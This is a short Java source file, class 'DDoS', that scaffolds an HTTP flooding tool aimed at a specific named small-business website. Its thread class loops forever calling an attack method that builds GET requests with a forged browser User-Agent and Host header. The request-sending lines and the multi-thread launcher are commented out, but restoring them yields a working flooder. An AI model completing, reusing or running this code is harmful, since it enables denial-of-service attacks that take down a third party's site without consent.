package testApplications;

import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class DDoS { 
    public static String host = "judkinscustomtaxidermy.com";
    public static void main(String... args) throws Exception {
        String testWeb = "https://judkinscustomtaxidermy.com/index.html";
        
        for (int i = 0; i < 1; i++) {
            DdosThread thread = new DdosThread(testWeb, host);
            thread.start();
        } 
    }    
    public static void DDoSSite(String victim, int threads) throws Exception{
        for (int i = 0; i < threads; i++) {
            //DdosThread thread = new DdosThread(victim, host);
            //thread.start();
        }
    }
   
     
 
    public static class DdosThread extends Thread {
 
        private AtomicBoolean running = new AtomicBoolean(true);
        //private final String request = "http://www.google.com";
        private final URL url;
 
        String param = null;
 
        public DdosThread(String urlToRequest, String newhost) throws Exception {
            url = new URL(urlToRequest);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        } 
 
 
        @Override 
        public void run() { 
            while (running.get()) {
                try { 
                    String newhost = null;
                    attack(newhost); 
                } catch (Exception e) {
 
                } 
 
 
            } 
        } 
 
        public void attack(String newhost) throws Exception {
            
            /*
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", newhost);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            //connection.setRequestProperty("Content-Length", "3495");
            System.out.println(this + " " + connection.getResponseCode());
            System.out.println(connection.getHeaderFields());
            connection.getInputStream();
            */



        } 
    } 
 
} 
